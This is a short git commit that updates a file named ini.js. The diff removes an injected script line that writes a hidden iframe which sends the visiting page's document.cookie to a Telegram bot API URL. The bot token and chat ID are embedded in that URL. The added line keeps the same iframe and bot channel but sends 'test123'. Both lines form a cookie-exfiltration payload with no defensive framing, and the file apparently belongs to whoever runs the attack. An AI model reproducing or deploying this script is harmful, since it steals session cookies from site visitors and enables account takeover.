6f83e51b8d97db5cc3632b73c5b58968b91fc162
eghi12 <87929136+eghi12@users.noreply.github.com>
2021-07-25 17:16:06 +0700

    Update ini.js

--- ini.js
+++ ini.js
@@ -1,3 +1,3 @@
 <script type="text/javascript"> 
-document.write("<iframe src='https://api.telegram.org/bot1940508405:AAEWrdw8aISVfTYhh8RVdSaiiFiMiz8VYgs/sendmessage?chat_id=867175498&text="+document.cookie+"'></iframe>");
+document.write("<iframe src='https://api.telegram.org/bot1940508405:AAEWrdw8aISVfTYhh8RVdSaiiFiMiz8VYgs/sendmessage?chat_id=867175498&text=test123'></iframe>");
 </script>
